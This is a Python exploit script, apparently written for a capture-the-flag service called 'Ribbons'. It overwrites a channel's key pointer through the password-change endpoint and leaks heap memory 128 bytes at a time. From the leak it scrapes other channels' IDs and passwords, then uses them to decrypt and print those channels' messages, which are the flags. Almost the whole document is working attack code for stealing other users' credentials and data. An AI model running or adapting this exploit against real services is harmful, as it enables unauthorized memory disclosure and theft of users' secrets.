import requests
import struct
from pwn import *

#Service is running on localhost
TARGET = "127.0.0.1"

BASE_URL = "http://%s:4243/api" %TARGET

def view(channel_id):
    url = "%s/view?channel_id=%d" % (BASE_URL, channel_id)
    r = requests.get(url, stream=True)
    return r.raw.read()

def view_nice(channel_id):
    info = {}
    data = view(channel_id)
    l = struct.unpack("L", data[0:8])[0]
    name = data[8:8+l]
    data = data[8+l:]
    info['name'] = name
    info['msg'] = []
    while len(data) > 8:
        l = struct.unpack("L", data[0:8])[0]
        msg = data[8:8+l]
        data = data[8+l:]
        info['msg'].append(msg)
    return info

def key(channel_id, password):
    url = "%s/key?channel_id=%d" % (BASE_URL, channel_id)
    r = requests.post(url, data={'password': password}, stream=True)
    return r.raw.read()

def add_channel(name, password):
    url = "%s/add_channel" % (BASE_URL)
    r = requests.post(url, data={'name': name, 'password': password}, stream=True)
    return int(r.raw.read().split(":")[1], 10)

def change_password(channel_id, password, newpassword):
    url = "%s/change_password?channel_id=%d" % (BASE_URL, channel_id)
    r = requests.post(url, data={'password': password, 'new_password': newpassword}, stream=True)
    return r.raw.read()

def add_post(channel_id, password, msg):
    url = "%s/add_post?channel_id=%d" % (BASE_URL, channel_id)
    r = requests.post(url, data={'password': password, 'text': msg}, stream=True)
    return r.raw.read()

def gen_string(size):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))

def xor(s1,s2):
    return ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(s1,s2))

def decrypt(msg, key):
    plain = ''
    plain = xor(msg, key*10000) # Just padding the key, spaghetti code here \0/
    return plain


#Create a new channel
name = gen_string(5)
chan_id = add_channel(name,"a"*16)
old_passwd = 'a'*16

#Load other recent chans in case they are not in memory
for o in range(chan_id-100,chan_id):
    view(o)

#Memory Scraping starts here
i = 8   #Allign memory
chan_byte = -1
attack = dict()

#It is possible to set this number in order to make the service crash or not.
#I chose it a bit less then 0x21000
while i < 135048:
    #Generate 3 bytes Little-Endian packed (strlen ends at \x00)
    offset = p32(i)[:-1]

    #Overwrite key address
    new_passwd = gen_string(16) + offset
    change_password(chan_id, old_passwd, new_passwd)
    old_passwd = new_passwd

    #128 Bytes leak
    leak = key(chan_id,old_passwd)

    #Detects crash
    if (len(leak)!=128):
        print "Segfault: Ribbons crashed"
        print "Error:"
        print leak
        print "i:",i
        exit(-1)

    #Iters on the leak to find an allocated chan
    for j in range(0,128,8):

        chunk = hex(u64(leak[j:j+8]))
        #I just found another allocated chan
        if chunk == "0x45" and chan_byte == -1:
            password = ""
            chan_byte = 0

        #Retrieve channel ID
        if chan_byte == 1:
            channel_id = u32(leak[j:j+4])
            #print "CHAN_ID:", u32(leak[j:j+4])

        #First 8 Bytes of password
        if chan_byte == 4:
            psw = leak[j:j+8]

        #Second 8 Bytes of password
        if chan_byte == 5:
            psw += leak[j:j+8]
            #Read password till is printable
            for c in psw:
                if c in string.printable:
                    password += c
                else:
                    break
            attack[int(channel_id)] = password
            #Start searching for next chan
            chan_byte = -1

        #Update chan_byte only if I'm parsing a chan
        chan_byte += 1
        if chan_byte == 0:
            chan_byte = -1

    #Go to next 128 Bytes
    i = i + (0x8*16)

#Now let's get the flags!
for enemy in attack:
    try:
        #Retrieve key and list of messages
        key_ = key(enemy, attack[enemy])
        messages = view_nice(enemy)['msg']

        msg = decrypt(messages[0], key_)
        #If I am looking at one of the channels I created for the exploit
        #The Key is pointing at something in memory and the messages won't have any sense.
        #Just skip them!
        if all(c in string.printable for c in msg):
            #Prints all the messages(flags) for Chan Id
            print "CHAN_ID:", enemy
            print "Message:", msg
            for i in range(1,len(messages)):
                msg = decrypt(messages[i], key_)
                print "Message:", msg 
            print ""
    except:
        continue
